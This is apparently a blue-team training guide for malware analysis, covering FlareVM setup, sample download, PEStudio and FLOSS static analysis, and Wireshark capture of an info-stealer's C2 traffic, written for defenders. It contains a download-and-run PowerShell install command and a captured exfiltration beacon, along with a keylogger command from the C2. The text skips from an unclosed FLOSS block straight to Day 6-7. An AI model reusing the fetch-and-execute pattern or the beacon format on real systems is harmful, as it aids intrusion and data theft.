# Project 14: Malware Reverse Engineering for Blue Teamers
**Platform:** FlareVM + Any.Run Free Tier + Wireshark | **Duration:** 2 weeks | **Difficulty:** Advanced

---

## Project Overview

Develop **practical malware analysis skills** focused on blue team outcomes — IOC extraction, YARA rule writing, and malware family identification. Perform static analysis (PEStudio, FLOSS, strings), dynamic analysis (ANY.RUN sandbox, FlareVM behavioral analysis), and network analysis (Wireshark C2 traffic capture) to produce actionable threat intelligence from real malware samples.

**This project proves you can:**
- Analyze malware to extract actionable IOCs for SOC operations
- Write YARA rules that detect malware families across the enterprise
- Identify C2 infrastructure through network traffic analysis
- Translate reverse engineering findings into detection rules
- Bridge the gap between malware analysis and SOC defense

**The Impact:** Extract 50+ IOCs and write 5+ YARA rules from real malware samples, enabling proactive detection of malware families before signature updates arrive.

---

## Learning Objectives

- Perform static malware analysis without executing samples
- Conduct dynamic behavioral analysis in isolated sandboxes
- Analyze C2 network traffic patterns using Wireshark
- Extract IOCs (hashes, IPs, domains, mutexes, registry keys)
- Write effective YARA rules for malware detection
- Identify malware families and their TTPs
- Create actionable intelligence reports from analysis findings

## Step-by-Step Execution Plan

### **Week 1: Static & Dynamic Analysis**

#### Day 1-2: FlareVM Setup & Static Analysis Fundamentals

**Step 1: Deploy FlareVM**

```powershell
# On a clean Windows 10 VM (snapshot BEFORE installing!)
# Take VM snapshot: "Clean-Windows-Pre-FlareVM"

# Install FlareVM
Set-ExecutionPolicy Unrestricted -Force
(New-Object net.webclient).DownloadFile(
    'https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',
    "$env:TEMP\install.ps1"
)
Unblock-File "$env:TEMP\install.ps1"
& "$env:TEMP\install.ps1"

# Installation takes 30-60 minutes
# Installs: PEStudio, FLOSS, x64dbg, Ghidra, YARA, CyberChef, etc.
# Take snapshot after: "FlareVM-Clean-Installed"
```

**Step 2: Download Malware Sample from MalwareBazaar**

```python
# download_sample.py — Run on HOST machine, transfer to FlareVM via shared folder
import requests
import hashlib

# Download a known sample (example: AgentTesla info-stealer)
SAMPLE_SHA256 = "get_hash_from_malwarebazaar"  # Replace with actual hash

response = requests.get(
    f"https://mb-api.abuse.ch/api/v1/",
    data={"query": "get_file", "sha256_hash": SAMPLE_SHA256},
    timeout=30
)

if response.status_code == 200:
    # Save password-protected zip (password: "infected")
    with open(f"sample_{SAMPLE_SHA256[:8]}.zip", "wb") as f:
        f.write(response.content)
    print(f"Downloaded sample: {SAMPLE_SHA256[:16]}...")
else:
    print(f"Failed: {response.status_code}")
```

**Step 3: Static Analysis with PEStudio**

```markdown
## Static Analysis Report — Sample #1

### File Properties
- **Filename:** invoice_2026.exe
- **File Size:** 847,360 bytes
- **MD5:** a1b2c3d4e5f6...
- **SHA256:** 1234567890abcdef...
- **File Type:** PE32 executable (GUI) Intel 80386
- **Compilation Timestamp:** 2026-01-10 04:23:17 UTC
- **Compiler:** Microsoft Visual C++ 2019

### PEStudio Findings
| Indicator | Value | Suspicion |
|-----------|-------|-----------|
| Entropy | 7.2 (high) | Packed/encrypted content |
| Imports | CreateRemoteThread, VirtualAllocEx | Process injection |
| Imports | InternetOpenA, HttpSendRequestA | Network communication |
| Imports | RegSetValueExA | Registry persistence |
| Resources | Contains embedded PE (entropy 6.8) | Dropper behavior |
| Sections | .text entropy 7.8 | Likely packed |
| Strings | "Mozilla/5.0" user-agent | C2 communication |
| Certificate | None (unsigned) | Suspicious for "legitimate" software |

### Suspicious Indicators
- [ ] High entropy sections → likely packed
- [ ] Process injection APIs → may inject into legitimate processes
- [ ] Network APIs → communicates externally
- [ ] Registry APIs → establishes persistence
- [ ] Embedded PE in resources → drops additional payload
```

**Step 4: String Extraction with FLOSS**

```bash
# Run FLOSS (FLARE Obfuscated String Solver)
floss.exe sample.exe > floss_output.txt

# FLOSS extracts:
# 1. Static strings (like 'strings' command)
# 2. Stack strings (constructed at runtime)
# 3. Decoded strings (deobfuscated)
```

```markdown
## FLOSS String Analysis

### Interesting Static Strings
```
http://185.220.101[.]42/gate.php
Mozilla/5.0 (Windows NT 10.0; Win64; x64)

#### Day 6-7: Network Analysis with Wireshark

**Step 1: Capture C2 Traffic**

```markdown
## Wireshark C2 Traffic Analysis

### Capture Setup
- Interface: Host-only adapter (FlareVM)
- Filter: `ip.addr == 185.220.101.42`
- Duration: 5 minutes of malware execution
- Packets captured: 847

### C2 Communication Pattern

#### Initial Beacon (HTTP POST)
```
POST /gate.php HTTP/1.1
Host: 185.220.101[.]42
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 342

data=dXNlcm5hbWU9YWRtaW4maG9zdG5hbWU9V0lOMTAtTEFCJm9zPVdpbmRvd3MgMTA...
```

#### Decoded Beacon (Base64 → plaintext)
```
username=admin&hostname=WIN10-LAB&os=Windows 10&ip=192.168.1.50
&antivirus=Windows Defender&cpu=Intel i7&ram=8GB
```

#### C2 Response (Commands)
```
HTTP/1.1 200 OK
Content-Type: text/plain

cmd=keylog_start|interval=30|upload_interval=300
```

### Wireshark Display Filters Used
```
# All HTTP traffic to C2
http.host contains "185.220.101"

# DNS queries for C2 domain
dns.qry.name contains "update-cdn"

# POST requests (data exfiltration)
http.request.method == "POST" && ip.dst == 185.220.101.42

# TLS traffic to C2 (if HTTPS)
tls.handshake.extensions_server_name contains "update-cdn"
```

### Network IOCs Extracted
| Type | Value | Confidence |
|------|-------|------------|
| IP | 185.220.101[.]42 | HIGH — direct C2 |
| Domain | update-cdn[.]xyz | HIGH — C2 domain |
| URL | /gate.php | HIGH — beacon endpoint |
| URL | /submit.php | HIGH — data exfil endpoint |
| User-Agent | Mozilla/5.0 (specific string) | MEDIUM — may match legit |
| JA3 Hash | abc123def456... | HIGH — TLS fingerprint |
```

## Interview Talking Points

### Question: "How do you analyze a suspicious file?"

**STAR Answer:**

**Situation:**  
"Our SOC received an alert for a suspicious executable that bypassed email filters. No vendor had flagged it — we needed to determine if it was malicious and extract IOCs for blocking."

**Task:**  
"I needed to analyze the file safely, determine its capabilities, extract IOCs, and create detections — all within a 2-hour SLA."

**Action:**  
"I followed a three-phase approach:

**Static analysis first** — I never execute unknown files immediately. Using PEStudio, I checked the PE headers, imports, and entropy. High entropy sections indicated packing, and imports like CreateRemoteThread and InternetOpenA suggested process injection and C2 communication. FLOSS extracted obfuscated strings including a URL pattern and registry persistence path.

**Dynamic analysis second** — I detonated the sample in Any.Run sandbox and simultaneously in my FlareVM with Process Monitor running. I observed it drop a copy to AppData, create a registry Run key for persistence, inject into explorer.exe, and beacon to an IP over HTTP POST every 30 seconds.

**Network analysis third** — Using Wireshark, I captured the C2 traffic. The beacon was HTTP POST to /gate.php with Base64-encoded system info. I decoded the payload in CyberChef and confirmed it was sending hostname, username, and OS version.

I then wrote a YARA rule targeting the unique string combinations and C2 URL patterns, tested it against clean files for false positives (zero), and deployed the IOCs to our SIEM and firewall."

**Result:**  
"Within 90 minutes, I identified the malware as an AgentTesla variant, extracted 15 IOCs (IPs, domains, file paths, registry keys, hashes), wrote 2 YARA rules, and deployed blocking rules. The YARA rule later caught 3 more variants in the following week that no vendor had signatures for."

## Common Mistakes to Avoid

1. **Running malware on host machine:** ALWAYS use isolated VM with host-only networking
2. **Skipping static analysis:** Don't jump to execution — static analysis is safer and faster
3. **Ignoring network analysis:** C2 traffic provides the most actionable network IOCs
4. **Writing too-broad YARA rules:** Broad rules = false positives — test against clean files
5. **Not taking VM snapshots:** Snapshot before EVERY execution — revert for clean state
6. **Forgetting to defang IOCs:** Always defang in reports: `185.220.101[.]42` not `185.220.101.42`

---

**Total Time Investment:** 30-40 hours over 2 weeks  
**Portfolio Artifacts:** 3 analysis reports, 5+ YARA rules, Wireshark analysis, 50+ IOCs  
**Job Market Value:** Malware analysis is a rare skill — <10% of SOC analysts can write YARA rules
